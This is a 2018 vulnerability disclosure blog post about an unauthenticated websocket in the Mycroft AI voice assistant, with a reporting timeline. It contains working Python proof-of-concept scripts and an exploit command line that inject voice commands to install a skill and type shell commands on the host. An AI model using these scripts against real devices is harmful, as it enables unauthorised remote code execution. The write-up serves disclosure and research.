<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Getting "Zero Click" Remote Code Execution in Mycroft AI vocal assistant - appsec & stuff</title><meta name=Description content><meta property="og:title" content="Getting &#34;Zero Click&#34; Remote Code Execution in Mycroft AI vocal assistant"><meta property="og:description" content="1 IntroductionDuring my journey contributing to open source I was working with my friend Matteo De Carlo on an AUR Package of a really interesting project called Mycroft AI. It&rsquo;s an AI-powered vocal assistant started with a crowdfunding campaign in 2015 and a more recent one that allowed Mycroft to produce their Mark-I and Mark-II devices. It&rsquo;s also running on Linux Desktop/Server, Raspberry PI and will be available soon™ on Jaguar F-Type and Land Rover"><meta property="og:type" content="article"><meta property="og:url" content="https://appsec.space/posts/mycroft-ai-rce/"><meta property="og:image" content="https://appsec.space/images/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2018-06-10T20:59:09+02:00"><meta property="article:modified_time" content="2023-03-21T22:11:59+01:00"><meta property="og:site_name" content="appsec.space"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://appsec.space/images/logo.png"><meta name=twitter:title content="Getting &#34;Zero Click&#34; Remote Code Execution in Mycroft AI vocal assistant"><meta name=twitter:description content="1 IntroductionDuring my journey contributing to open source I was working with my friend Matteo De Carlo on an AUR Package of a really interesting project called Mycroft AI. It&rsquo;s an AI-powered vocal assistant started with a crowdfunding campaign in 2015 and a more recent one that allowed Mycroft to produce their Mark-I and Mark-II devices. It&rsquo;s also running on Linux Desktop/Server, Raspberry PI and will be available soon™ on Jaguar F-Type and Land Rover"><meta name=application-name content="appsec & stuff"><meta name=apple-mobile-web-app-title content="appsec & stuff"><meta name=theme-color content="#f8f8f8"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=canonical href=https://appsec.space/posts/mycroft-ai-rce/><link rel=next href=https://appsec.space/posts/long-time-no-see/><link rel=stylesheet href=/lib/normalize/normalize.min.8235a67a2521ef99fb1e455a5891b022af1653b4ede3cfffcac4e473beee88fbcc1a36bbb3cfdd75fd6df46732032f9d96e30adae9c88b769e1fbf7945cd27e0.css integrity="sha512-gjWmeiUh75n7HkVaWJGwIq8WU7Tt48//ysTkc77uiPvMGja7s8/ddf1t9GcyAy+dluMK2unIi3aeH795Rc0n4A=="><link rel=stylesheet href=/css/color.346090a8e4618da38ff45853421bbd1d5ffa3c25e678a3f0131c9f7d5300e15669f91c74f1ed5fab76e7424a2a6a5619a9dc45f99e04f246e37d8af51295b6ae.css integrity="sha512-NGCQqORhjaOP9FhTQhu9HV/6PCXmeKPwExyffVMA4VZp+Rx08e1fq3bnQkoqalYZqdxF+Z4E8kbjfYr1EpW2rg=="><link rel=stylesheet href=/css/style.min.4e095839fd5f20d6195e36a7c66b12557624ffcbf553e9fac05f0a99d65d30f9bfdd46adbc6715d94a12d6ae344c25ed45b9bb4ac2caf24939c5ba96f4b76846.css integrity="sha512-TglYOf1fINYZXjanxmsSVXYk/8v1U+n6wF8KmdZdMPm/3UatvGcV2UoS1q40TCXtRbm7SsLK8kk5xbqW9LdoRg=="><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/fontawesome-free/all.min.eb8387c9eb0ab6d4fa4d7ad397d15df13b92c009a1eb221b757dd1ecfccabc78a4c5b681847a7f4198ff7cd60abed8300508c9dea138cd1f4a85f09f09b2092a.css integrity="sha512-64OHyesKttT6TXrTl9Fd8TuSwAmh6yIbdX3R7PzKvHikxbaBhHp/QZj/fNYKvtgwBQjJ3qE4zR9KhfCfCbIJKg=="><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.eb8387c9eb0ab6d4fa4d7ad397d15df13b92c009a1eb221b757dd1ecfccabc78a4c5b681847a7f4198ff7cd60abed8300508c9dea138cd1f4a85f09f09b2092a.css integrity="sha512-64OHyesKttT6TXrTl9Fd8TuSwAmh6yIbdX3R7PzKvHikxbaBhHp/QZj/fNYKvtgwBQjJ3qE4zR9KhfCfCbIJKg=="></noscript><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/animate/animate.min.738daa4d2c3fc0f677ff92c1cc3f81c397fb6d2176a31a2eeb011bf88fe5a9e68a57914321f32fbd1a7bef6cb88dc24b2ae1943a96c931d83f053979d1f25803.css integrity="sha512-c42qTSw/wPZ3/5LBzD+Bw5f7bSF2oxou6wEb+I/lqeaKV5FDIfMvvRp772y4jcJLKuGUOpbJMdg/BTl50fJYAw=="><noscript><link rel=stylesheet href=/lib/animate/animate.min.738daa4d2c3fc0f677ff92c1cc3f81c397fb6d2176a31a2eeb011bf88fe5a9e68a57914321f32fbd1a7bef6cb88dc24b2ae1943a96c931d83f053979d1f25803.css integrity="sha512-c42qTSw/wPZ3/5LBzD+Bw5f7bSF2oxou6wEb+I/lqeaKV5FDIfMvvRp772y4jcJLKuGUOpbJMdg/BTl50fJYAw=="></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Getting \"Zero Click\" Remote Code Execution in Mycroft AI vocal assistant","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/appsec.space\/posts\/mycroft-ai-rce\/"},"genre":"posts","keywords":"writeup, code review, AI, vocal assistant","wordcount":818,"url":"https:\/\/appsec.space\/posts\/mycroft-ai-rce\/","datePublished":"2018-06-10T20:59:09+02:00","dateModified":"2023-03-21T22:11:59+01:00","publisher":{"@type":"Organization","name":"himazawa"},"author":{"@type":"Person","name":"himazawa"},"description":""}</script><script src=//instant.page/5.1.1 defer type=module integrity=sha384-MWfCL6g1OTGsbSwfuMHc8+8J2u71/LA8dzlIN3ycajckxuZZmF+DNjdm7O6H3PSq></script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>function setTheme(e){document.body.setAttribute("theme",e),document.documentElement.style.setProperty("color-scheme",e==="light"?"light":"dark")}function saveTheme(e){window.localStorage&&localStorage.setItem("theme",e)}function getMeta(e){const t=document.getElementsByTagName("meta");for(let n=0;n<t.length;n++)if(t[n].getAttribute("name")===e)return t[n];return""}if(window.localStorage&&localStorage.getItem("theme")){let e=localStorage.getItem("theme");e==="light"||e==="dark"||e==="black"?setTheme(e):setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")}else"auto"==="light"||"auto"==="dark"||"auto"==="black"?(setTheme("auto"),saveTheme("auto")):(saveTheme("auto"),setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"));let metaColors={light:"#f8f8f8",dark:"#252627",black:"#000000"};getMeta("theme-color").content=metaColors[document.body.getAttribute("theme")]</script><div id=back-to-top></div><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="appsec & stuff"><img class=logo loading=lazy src=/images/circle_cropped_logo.png srcset="/images/circle_cropped_logo.png, /images/circle_cropped_logo.png 1.5x, /images/circle_cropped_logo.png 2x" sizes=auto alt=/images/circle_cropped_logo.png title=/images/circle_cropped_logo.png></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/>About me </a><span class="menu-item delimiter"></span><a href=# class="menu-item language" title="Select Language">English<i class="fas fa-chevron-right fa-fw"></i>
<select class=language-select title="Select Language" id=language-select-desktop onchange="location=this.value"><option value=/posts/mycroft-ai-rce/ selected>English</option></select>
</a><span class="menu-item search" id=search-desktop><input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=# class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw"></i></a>
<a href=# class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i></span>
</span><a href=# class="menu-item theme-select" title="Switch Theme"><i class="fas fa-adjust fa-fw"></i>
<select class=color-theme-select id=theme-select-desktop title="Switch Theme"><option value=light>Light</option><option value=dark>Dark</option><option value=black>Black</option><option value=auto>Auto</option></select></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="appsec & stuff"><img class=logo loading=lazy src=/images/circle_cropped_logo.png srcset="/images/circle_cropped_logo.png, /images/circle_cropped_logo.png 1.5x, /images/circle_cropped_logo.png 2x" sizes=auto alt=/images/circle_cropped_logo.png title=/images/circle_cropped_logo.png></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=# class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw"></i></a>
<a href=# class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw"></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=# class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/about/ title>About me</a><a href=# class="menu-item theme-select" title="Switch Theme">
<i class="fas fa-adjust fa-fw"></i>
<select class=color-theme-select id=theme-select-mobile title="Switch Theme"><option value=light>Light</option><option value=dark>Dark</option><option value=black>Black</option><option value=auto>Auto</option></select>
</a><a href=# class=menu-item title="Select Language">English<i class="fas fa-chevron-right fa-fw"></i>
<select class=language-select title="Select Language" onchange="location=this.value"><option value=/posts/mycroft-ai-rce/ selected>English</option></select></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#digging-in-the-source-code>Digging in the source code</a></li><li><a href=#the-skills-system>The skills system</a></li><li><a href=#what-can-i-do-now>What can I do now?</a><ul><li><a href=#so-im-done>So I&rsquo;m done?</a></li></ul></li><li><a href=#getting-a-remote-shell-using-default-skills>Getting a remote shell using default skills</a></li><li><a href=#_notes_><em>Notes</em></a></li><li><a href=#affected-devices>Affected devices</a></li><li><a href=#timeline>Timeline</a></li></ul></nav></div></div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle","normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC","true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Getting "Zero Click" Remote Code Execution in Mycroft AI vocal assistant</h1><h2 class=single-subtitle>Hey Mycroft, we've got a Problem</h2><div class=post-meta><div class=post-meta-line><span class=post-author><i class="author fas fa-user-circle fa-fw"></i><a href=/ title=Author rel=author class=author>himazawa</a>
</span>&nbsp;<span class=post-category>included in </span>&nbsp;<span class=post-category>category <a href=/categories/vulnerability-research/><i class="far fa-folder fa-fw"></i>vulnerability-research</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=2018-06-10>2018-06-10</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime=2023-03-21>2023-03-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;818 words&nbsp;
<i class="far fa-clock fa-fw"></i>&nbsp;4 minutes&nbsp;</div></div><div class=featured-image><img loading=eager src=https://mycroft.ai/wp-content/uploads/2018/05/Mark1CROP.png srcset="https://mycroft.ai/wp-content/uploads/2018/05/Mark1CROP.png, https://mycroft.ai/wp-content/uploads/2018/05/Mark1CROP.png 1.5x, https://mycroft.ai/wp-content/uploads/2018/05/Mark1CROP.png 2x" sizes=auto alt=https://mycroft.ai/wp-content/uploads/2018/05/Mark1CROP.png title=https://mycroft.ai/wp-content/uploads/2018/05/Mark1CROP.png height=auto width=auto></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#digging-in-the-source-code>Digging in the source code</a></li><li><a href=#the-skills-system>The skills system</a></li><li><a href=#what-can-i-do-now>What can I do now?</a><ul><li><a href=#so-im-done>So I&rsquo;m done?</a></li></ul></li><li><a href=#getting-a-remote-shell-using-default-skills>Getting a remote shell using default skills</a></li><li><a href=#_notes_><em>Notes</em></a></li><li><a href=#affected-devices>Affected devices</a></li><li><a href=#timeline>Timeline</a></li></ul></nav></div></div><div class=content id=content><h2 id=introduction class=headerLink><a href=#introduction class=header-mark></a>1 Introduction</h2><p>During my journey contributing to open source I was working with my friend <a href=https://github.com/portaloffreedom target=_blank rel="noopener noreferrer">Matteo De Carlo</a> on an <a href=https://git.covolunablu.org/portaloffreedom/plasma-mycroft-PKGBUILD target=_blank rel="noopener noreferrer">AUR Package</a> of a really interesting project called <a href=https://mycroft.ai target=_blank rel="noopener noreferrer">Mycroft AI</a>. It&rsquo;s an AI-powered vocal assistant started with a <a href=https://www.kickstarter.com/projects/aiforeveryone/mycroft-an-open-source-artificial-intelligence-for target=_blank rel="noopener noreferrer">crowdfunding campaign</a> in 2015 and a <a href=https://www.indiegogo.com/projects/mycroft-mark-ii-the-open-voice-assistant#/ target=_blank rel="noopener noreferrer">more recent one</a> that allowed Mycroft to produce their Mark-I and Mark-II devices. It&rsquo;s also running on Linux Desktop/Server, Raspberry PI and will be available soon™ on <a href="https://www.youtube.com/watch?v=6GHmzbXp_jY" target=_blank rel="noopener noreferrer">Jaguar F-Type</a> and <a href=https://mycroft.ai/blog/mycroft-welcomes-jaguar-land-rover-new-investor/ target=_blank rel="noopener noreferrer">Land Rover</a></p><h2 id=digging-in-the-source-code class=headerLink><a href=#digging-in-the-source-code class=header-mark></a>2 Digging in the source code</h2><p>While looking at the <a href=https://github.com/MycroftAI/mycroft-core target=_blank rel="noopener noreferrer">source code</a> I found an interesting point: <a href=https://github.com/MycroftAI/mycroft-core/blob/1f4c98f29ceb6a7981474f1620441e43aa364d00/mycroft/messagebus/service/main.py#L28-L57 target=_blank rel="noopener noreferrer">here</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=n>host</span> <span class=o>=</span> <span class=n>config</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;host&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>port</span> <span class=o>=</span> <span class=n>config</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;port&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>route</span> <span class=o>=</span> <span class=n>config</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s2>&#34;route&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>validate_param</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=s2>&#34;websocket.host&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>validate_param</span><span class=p>(</span><span class=n>port</span><span class=p>,</span> <span class=s2>&#34;websocket.port&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>validate_param</span><span class=p>(</span><span class=n>route</span><span class=p>,</span> <span class=s2>&#34;websocket.route&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>routes</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=n>route</span><span class=p>,</span> <span class=n>WebsocketEventHandler</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>application</span> <span class=o>=</span> <span class=n>web</span><span class=o>.</span><span class=n>Application</span><span class=p>(</span><span class=n>routes</span><span class=p>,</span> <span class=o>**</span><span class=n>settings</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>application</span><span class=o>.</span><span class=n>listen</span><span class=p>(</span><span class=n>port</span><span class=p>,</span> <span class=n>host</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ioloop</span><span class=o>.</span><span class=n>IOLoop</span><span class=o>.</span><span class=n>instance</span><span class=p>()</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=o>...</span>
</span></span></code></pre></td></tr></table></div></div><p>it defines a websocket server that uses to get instructions from the remote clients (like the <a href=https://github.com/MycroftAI/Mycroft-Android target=_blank rel="noopener noreferrer">Android one</a>). The settings for the websocket server are defined in <a href=https://github.com/MycroftAI/mycroft-core/blob/aa594aebea99eebd0109ad013b71a2210f2b72f4/mycroft/configuration/mycroft.conf#L111-L117 target=_blank rel="noopener noreferrer">mycroft.conf</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=c1>// The mycroft-core messagebus&#39; websocket
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=s2>&#34;websocket&#34;</span><span class=err>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;host&#34;</span><span class=p>:</span> <span class=s2>&#34;0.0.0.0&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;port&#34;</span><span class=p>:</span> <span class=mi>8181</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;route&#34;</span><span class=p>:</span> <span class=s2>&#34;/core&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;ssl&#34;</span><span class=p>:</span> <span class=kc>false</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=err>,</span>
</span></span></code></pre></td></tr></table></div></div><p>So there is a websocket server that doesn&rsquo;t require authentication that by default is exposed on <code>0.0.0.0:8181/core</code>. Let&rsquo;s test it 😉</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>asyncio</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>websockets</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>uri</span> <span class=o>=</span> <span class=s2>&#34;ws://myserver:8181/core&#34;</span>
</span></span><span class=line><span class=cl><span class=n>command</span> <span class=o>=</span> <span class=s2>&#34;say pwned&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>async</span> <span class=k>def</span> <span class=nf>sendPayload</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>async</span> <span class=k>with</span> <span class=n>websockets</span><span class=o>.</span><span class=n>connect</span><span class=p>(</span><span class=n>uri</span><span class=p>)</span> <span class=k>as</span> <span class=n>websocket</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>await</span> <span class=n>websocket</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;{</span><span class=se>\&#34;</span><span class=s2>data</span><span class=se>\&#34;</span><span class=s2>: {</span><span class=se>\&#34;</span><span class=s2>utterances</span><span class=se>\&#34;</span><span class=s2>: [</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=o>+</span><span class=n>command</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>]}, </span><span class=se>\&#34;</span><span class=s2>type</span><span class=se>\&#34;</span><span class=s2>: </span><span class=se>\&#34;</span><span class=s2>recognizer_loop:utterance</span><span class=se>\&#34;</span><span class=s2>, </span><span class=se>\&#34;</span><span class=s2>context</span><span class=se>\&#34;</span><span class=s2>: null}&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>asyncio</span><span class=o>.</span><span class=n>get_event_loop</span><span class=p>()</span><span class=o>.</span><span class=n>run_until_complete</span><span class=p>(</span><span class=n>sendPayload</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><p>And magically we have an answer from the vocal assistant saying <code>pwned</code>!</p><p>Well, now we can have Mycroft pronounce stuff remotely, but this is not a really big finding unless you want to scare your friends, right?</p><figure><img src=https://media1.tenor.com/images/8a4a99d3bd67ba8d9a025c36edf4a624/tenor.gif><figcaption><h4>WRONG</h4></figcaption></figure><h2 id=the-skills-system class=headerLink><a href=#the-skills-system class=header-mark></a>3 The skills system</h2><p>Digging deeper we can see that Mycroft has a skills system and a default skill that can install others skills (pretty neat, right?)</p><p>How is a skill composed? From what we can see from the documentation a default skill is composed by:</p><ul><li><code>dialog/en-us/command.dialog</code> contains the vocal command that will trigger the skill</li><li><code>vocab/en-us/answer.voc</code> contains the answer that Mycroft will pronounce</li><li><code>requirements.txt</code> contains the requirements for the skill that will be installed with <code>pip</code></li><li><code>__int__.py</code> contains the main function of the skill and will be loaded when the skill is triggered</li></ul><h2 id=what-can-i-do-now class=headerLink><a href=#what-can-i-do-now class=header-mark></a>4 What can I do now?</h2><p>I could create a malicious skill that when triggered runs arbitrary code on the remote machine, but unfortunately this is not possible via vocal command unless the URL of the skill is not whitelisted via the online website. So this is possible but will be a little tricky.</p><h3 id=so-im-done class=headerLink><a href=#so-im-done class=header-mark></a>4.1 So I&rsquo;m done?</h3><p>Not yet. I found out that I can trigger skills remotely and that is possible to execute commands on a remote machine convincing the user to install a malicious skill. I may have enough to submit a vulnerability report. But maybe I can do a bit better&mldr;</p><h2 id=getting-a-remote-shell-using-default-skills class=headerLink><a href=#getting-a-remote-shell-using-default-skills class=header-mark></a>5 Getting a remote shell using default skills</h2><p>We know that Mycroft has some <a href=https://github.com/MycroftAI/mycroft-skills target=_blank rel="noopener noreferrer">default skills</a> like <code>open</code> that will open an application and others that are whitelisted but not installed. Reading through to the list, I found a really interesting skill called <code>skill-autogui</code>, whose description says <code>Manipulate your mouse and keyboard with Mycroft</code>. <strong>We got it!</strong></p><p>Let&rsquo;s try to combine everything we found so far into a PoC:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>asyncio</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>websockets</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cmds</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;mute audio&#34;</span><span class=p>]</span> <span class=o>+</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>:]</span>
</span></span><span class=line><span class=cl><span class=n>uri</span> <span class=o>=</span> <span class=s2>&#34;ws://myserver:8181/core&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>async</span> <span class=k>def</span> <span class=nf>sendPayload</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>payload</span> <span class=ow>in</span> <span class=n>cmds</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>async</span> <span class=k>with</span> <span class=n>websockets</span><span class=o>.</span><span class=n>connect</span><span class=p>(</span><span class=n>uri</span><span class=p>)</span> <span class=k>as</span> <span class=n>websocket</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>await</span> <span class=n>websocket</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;{</span><span class=se>\&#34;</span><span class=s2>data</span><span class=se>\&#34;</span><span class=s2>: {</span><span class=se>\&#34;</span><span class=s2>utterances</span><span class=se>\&#34;</span><span class=s2>: [</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=o>+</span><span class=n>payload</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>]}, </span><span class=se>\&#34;</span><span class=s2>type</span><span class=se>\&#34;</span><span class=s2>: </span><span class=se>\&#34;</span><span class=s2>recognizer_loop:utterance</span><span class=se>\&#34;</span><span class=s2>, </span><span class=se>\&#34;</span><span class=s2>context</span><span class=se>\&#34;</span><span class=s2>: null}&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>asyncio</span><span class=o>.</span><span class=n>get_event_loop</span><span class=p>()</span><span class=o>.</span><span class=n>run_until_complete</span><span class=p>(</span><span class=n>sendPayload</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><p>Running the exploit with <code>python pwn.py "install autogui" "open xterm" "type echo pwned" "press enter"</code> allowed me to finally get a command execution on a Linux machine.</p><figure><img src=https://raw.githubusercontent.com/Nhoya/MycroftAI-RCE/master/PoC.gif><figcaption><h4>PoC</h4></figcaption></figure><h2 id=_notes_ class=headerLink><a href=#_notes_ class=header-mark></a>6 <em>Notes</em></h2><ul><li><code>open xterm</code> was needed because my test Linux environment had a DE installed, on a remote server the commands will be executed directly on TTY so this step is not nesessary.</li><li>The skill branching had a <a href=https://mycroft.ai/blog/skill-branching-18-02/ target=_blank rel="noopener noreferrer">big change</a> and now some skills are not (yet) available (autogui is one of them) but this is not the real point. Mycroft has skills to interact with domotic houses and other services that can still be manipulated (the lack of imagination is the limit here). The vulnerability lies in the lack of authentication for the ws.</li></ul><h2 id=affected-devices class=headerLink><a href=#affected-devices class=header-mark></a>7 Affected devices</h2><pre><code>All the devices running Mycroft &lt;= ? with the websocket server exposed (Mark-I has the websocket behind a firewall by default)
</code></pre><h2 id=timeline class=headerLink><a href=#timeline class=header-mark></a>8 Timeline</h2><ul><li>08/03/2018 Vulnerability found</li><li>09/03/2018 Vulnerability reported</li><li>13/03/2018 The CTO answered that they are aware of this problem and are currently working on a patch</li><li>06/06/2018 The CTO said that they have no problem with the release of the vulnerability and will add a warning to remember the user to use a firewall <code>¯\_(ツ)_/¯</code></li><li>09/06/2018 Public disclosure</li></ul></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2023-03-21&nbsp;<a class=git-hash href=https://github.com/homazawa/himazawa.github.io/commit/3bea88a6ced9f40d3fe826142591f60f5d87cb39 target=_blank title="commit by himazawa() 3bea88a6ced9f40d3fe826142591f60f5d87cb39: feat: restored mycroft post and new config" rel="noopener noreferrer">
<i class="fas fa-hashtag fa-fw"></i>3bea88a</a></span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-mardown href=/posts/mycroft-ai-rce/index.md target=_blank rel="noopener noreferrer">Read markdown</a></span></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/writeup/>writeup</a>,&nbsp;<a href=/tags/code-review/>code review</a>,&nbsp;<a href=/tags/ai/>AI</a>,&nbsp;<a href=/tags/vocal-assistant/>vocal assistant</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/posts/long-time-no-see/ class=next rel=next title="Long Time No See">Long Time No See<i class="fas fa-angle-right fa-fw"></i></a></div></div></article></div></main></div><div id=fixed-buttons><a href=#back-to-top id=back-to-top-button class=fixed-button title="Back to Top"><i class="fas 